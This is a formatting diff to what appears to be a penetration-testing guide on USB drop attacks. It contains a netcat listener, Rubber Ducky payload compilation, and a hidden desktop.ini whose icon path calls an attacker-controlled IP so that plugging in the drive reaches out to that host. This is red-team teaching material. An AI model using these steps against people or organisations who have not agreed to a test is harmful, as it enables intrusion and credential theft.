@@ -231,12 +231,12 @@ We'll discuss this in the “Branding” section below, but in short include log
 
 Recieve Callbacks  
 
-- Start a web service on Kali
+- Start a web service on Kali  
 `service apache2 start`  
 - If you pointed your payload to a web address, then you can review your apache logs at /var/log/apache2/access.log
   - Example:  
 ![USB Drop Callback](/assets/images/usb_drop_callback.jpg)  
-- If you pointed your payload to a specific port, you can listen to it with netcat
+- If you pointed your payload to a specific port, you can listen to it with netcat  
 `nc -nvlp <PORT>`  
 
 Example Files
@@ -265,9 +265,9 @@ How to do it
 
 Preparing Web Server  
 
-- Start web server
+- Start web server  
   - `service apache2 start`  
-- Create HTML file you want the user directed to
+- Create HTML file you want the user directed to  
   - `touch /var/www/html/rubber_ducky.html`  
 
 **Side-Note:** If you're dropping more than one rubber ducky, an easy way to tell which ducky was plugged in is to point them to separate HTML files and see which is accessed. Example lime_green.html, hallway.html
@@ -303,7 +303,8 @@ ENTER
 ```  
 - Compile the ducky script into an inject.bin file
   - `java -jar duckencoder.jar -i <TXT_FILE> -o /Volumes/NO\ NAME/inject.bin`  
-  - Example: `java -jar duckencoder.jar -i rubberducky.txt -o /Volumes/NO\ NAME/inject.bin`  
+  - Example:  
+  `java -jar duckencoder.jar -i rubberducky.txt -o /Volumes/NO\ NAME/inject.bin`  
 - Place the inject.bin file on the root directory of the micro USB
 
 Recieve Callbacks
@@ -338,28 +339,29 @@ How to do it (Win OS instructions)
 
 Folder Preparation
 
-- Create an interesting folder on the USB drive (private/documents/finance/passwords/confidential)
+- Create an interesting folder on the USB drive (private/documents/finance/passwords/confidential)  
 `mkdir <Folder_Name>`  
 
-- Make the folder a "system" folder
+- Make the folder a "system" folder  
 `attrib +s <path_to_folder>`  
 
 File Preparation
 
 - Create a file titled “desktop.ini”
-- Place the below code in the file
-`[.ShellClassInfo]
+- Place the below code in the file  
+`[.ShellClassInfo]  
 IconResource=\\<ATTACKING_IP>\<TARGET_COMPANY>?usb=<USB_DESCRIPTION>.ico,0`  
+  
 Example  
-`[.ShellClassInfo]
+`[.ShellClassInfo]  
 IconResource=\\1.2.3.4\Google?usb=LimeGreen.ico,0`  
 
-- Set file to be a "system" file and to be hidden
+- Set file to be a "system" file and to be hidden  
 `attrib +s +h desktop.ini`  
 
 Recieve Callbacks  
 
-- Start web server on Kali
+- Start web server on Kali  
 `service apache2 start`  
 
 If SMB isn’t allowed outbound you can look at the /var/log/apache2/access.log in Kali to view connections.  
